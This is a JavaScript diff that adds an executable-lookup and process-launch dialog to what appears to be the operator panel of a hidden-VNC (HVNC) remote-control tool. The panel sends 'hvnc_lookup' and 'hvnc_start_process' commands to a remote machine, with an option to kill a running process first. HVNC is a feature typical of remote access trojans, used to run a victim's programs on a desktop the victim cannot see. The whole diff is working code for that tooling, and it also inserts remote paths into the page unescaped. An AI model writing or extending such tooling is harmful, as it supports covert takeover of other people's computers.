@@ -647,6 +647,10 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
         handleCloneProgress(msg);
         return;
       }
+      if (msg && msg.type === "hvnc_lookup_result") {
+        handleLookupResult(msg);
+        return;
+      }
       if (msg && msg.type === "hvnc_error") {
         console.error("hvnc: server error:", msg.error || msg.message);
         return;
@@ -661,6 +665,10 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     }
     if (msg && msg.type === "hvnc_clone_progress") {
       handleCloneProgress(msg);
+      return;
+    }
+    if (msg && msg.type === "hvnc_lookup_result") {
+      handleLookupResult(msg);
       return;
     }
     if (msg && msg.type === "hvnc_error") {
@@ -897,6 +905,10 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
           hideContextMenu();
           showCustomExeModal();
           return;
+        } else if (action === "lookup-exe") {
+          hideContextMenu();
+          showLookupExeModal();
+          return;
         }
         hideContextMenu();
       });
@@ -941,6 +953,113 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     document.getElementById("hvncCustomExeRun").addEventListener("click", run);
     pathInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); argsInput.focus(); } });
     argsInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); run(); } });
+  }
+
+  let activeLookupOverlay = null;
+
+  function showLookupExeModal() {
+    if (activeLookupOverlay) activeLookupOverlay.remove();
+    const overlay = document.createElement("div");
+    overlay.id = "hvncLookupExeOverlay";
+    overlay.className = "fixed inset-0 z-[100] flex items-center justify-center bg-black/60";
+    overlay.innerHTML = `
+      <div class="bg-slate-900 border border-slate-700 rounded-xl p-5 w-[480px] shadow-2xl flex flex-col" style="max-height:80vh">
+        <div class="text-sm font-semibold text-slate-100 mb-3">Lookup Executable</div>
+        <label class="block text-xs text-slate-400 mb-1">Exe filename (e.g. notepad.exe)</label>
+        <div class="flex gap-2 mb-3">
+          <input id="hvncLookupExeName" type="text" placeholder="notepad.exe"
+            class="flex-1 bg-slate-800 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100 focus:outline-none focus:border-violet-500" />
+          <button id="hvncLookupBtn" class="button primary text-sm px-4">
+            <i class="fa-solid fa-magnifying-glass mr-1"></i>Lookup
+          </button>
+        </div>
+        <div id="hvncLookupStatus" class="text-xs text-slate-500 mb-2 hidden">
+          <i class="fa-solid fa-spinner fa-spin mr-1"></i>Searching…
+        </div>
+        <div id="hvncLookupResults" class="flex-1 overflow-y-auto min-h-[60px] max-h-[400px] bg-slate-950 border border-slate-800 rounded p-2">
+          <div class="text-xs text-slate-600 text-center py-4">Results will appear here</div>
+        </div>
+        <div class="flex items-center mt-3">
+          <label class="flex items-center gap-2 cursor-pointer select-none">
+            <input type="checkbox" id="hvncLookupKill" class="accent-red-500 w-4 h-4 rounded" />
+            <span class="text-xs text-slate-300">Kill before starting</span>
+          </label>
+          <div class="ml-auto">
+            <button id="hvncLookupClose" class="button ghost text-sm">Close</button>
+          </div>
+        </div>
+      </div>`;
+    document.body.appendChild(overlay);
+    activeLookupOverlay = overlay;
+
+    const nameInput = document.getElementById("hvncLookupExeName");
+    const lookupBtn = document.getElementById("hvncLookupBtn");
+    const statusEl = document.getElementById("hvncLookupStatus");
+    const resultsEl = document.getElementById("hvncLookupResults");
+    nameInput.focus();
+
+    function close() { overlay.remove(); activeLookupOverlay = null; }
+    document.getElementById("hvncLookupClose").addEventListener("click", close);
+    overlay.addEventListener("click", (e) => { if (e.target === overlay) close(); });
+
+    function startLookup() {
+      const exe = nameInput.value.trim();
+      if (!exe) return;
+      resultsEl.innerHTML = "";
+      statusEl.classList.remove("hidden");
+      lookupBtn.disabled = true;
+      lookupBtn.classList.add("opacity-50");
+      sendCmd("hvnc_lookup", { exe });
+    }
+
+    lookupBtn.addEventListener("click", startLookup);
+    nameInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); startLookup(); } });
+  }
+
+  function handleLookupResult(msg) {
+    const overlay = activeLookupOverlay;
+    if (!overlay) return;
+    const statusEl = document.getElementById("hvncLookupStatus");
+    const resultsEl = document.getElementById("hvncLookupResults");
+    const lookupBtn = document.getElementById("hvncLookupBtn");
+    if (!resultsEl) return;
+
+    if (msg.done) {
+      if (statusEl) {
+        statusEl.innerHTML = '<i class="fa-solid fa-check mr-1 text-emerald-400"></i>Search complete';
+        setTimeout(() => statusEl.classList.add("hidden"), 3000);
+      }
+      if (lookupBtn) {
+        lookupBtn.disabled = false;
+        lookupBtn.classList.remove("opacity-50");
+      }
+      if (!resultsEl.querySelector("[data-lookup-path]")) {
+        resultsEl.innerHTML = '<div class="text-xs text-slate-500 text-center py-4">No results found</div>';
+      }
+      return;
+    }
+
+    if (msg.path) {
+      // Remove placeholder if present
+      const placeholder = resultsEl.querySelector(":scope > div:not([data-lookup-path])");
+      if (placeholder) placeholder.remove();
+
+      const item = document.createElement("button");
+      item.type = "button";
+      item.dataset.lookupPath = msg.path;
+      item.className = "w-full text-left px-2 py-1.5 rounded text-xs text-slate-200 hover:bg-violet-600/30 hover:text-violet-100 transition-colors font-mono truncate block";
+      item.textContent = msg.path;
+      item.title = "Click to start in HVNC: " + msg.path;
+      item.addEventListener("click", () => {
+        const killCheckbox = document.getElementById("hvncLookupKill");
+        const killExe = killCheckbox?.checked ? msg.exe : "";
+        sendCmd("hvnc_start_process", { path: '"' + msg.path + '"', kill_exe: killExe });
+        item.classList.add("text-emerald-400");
+        item.innerHTML = '<i class="fa-solid fa-check mr-1"></i>' + (killExe ? '(killed) ' : '') + msg.path;
+      });
+      resultsEl.appendChild(item);
+      item.scrollIntoView({ block: "nearest" });
+    }
   }
 
   function updateLatencyDisplay(ms) {
